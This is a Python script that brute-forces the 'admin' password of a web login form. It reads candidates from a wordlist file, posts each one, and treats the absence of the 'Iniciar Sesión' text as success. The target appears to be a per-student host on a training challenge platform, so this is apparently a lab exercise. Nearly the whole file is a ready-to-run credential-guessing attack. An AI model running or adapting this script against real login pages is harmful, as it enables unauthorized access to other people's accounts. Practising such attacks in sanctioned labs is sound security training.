import requests

# DECLARATION OF STATIC VARIABLES
url = "http://juancruzberrios731.xsseasychallenge.academy-challenges.com/index.php"
password_file = "passwords_db.txt"

# Function to load passwords from a file
def load_file(file):
    try:
        with open(file, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"The file {file} could not be found")
        return []

# Function to perform brute-force attack
def bruteforce_login(url, passwords):
    final_username = "admin"
    final_password = ""

    # Create a session to handle cookies automatically
    session = requests.Session()

    # Loop through password list
    for password in passwords:
        data = {
            "username": final_username,
            "password": password
        }

        try:
            # HTTP POST request
            response = session.post(url, data=data)
            # Check if login failed
            if "Iniciar Sesión" in response.text:
                print(f"[-] Invalid password: {password}")
            else:
                print(f"[+] Valid password found: {password}")
                final_password = password
                break  # Stop brute-force attack

        except requests.exceptions.RequestException as e:
            print(f"[!] Error in request: {e}")

    # Print final credentials found
    if(final_password==""):final_password="no match"
    print(f"Username: {final_username}, Password: {final_password}")

# Load passwords
passwords = load_file(password_file)

# Run brute-force attack
bruteforce_login(url, passwords)
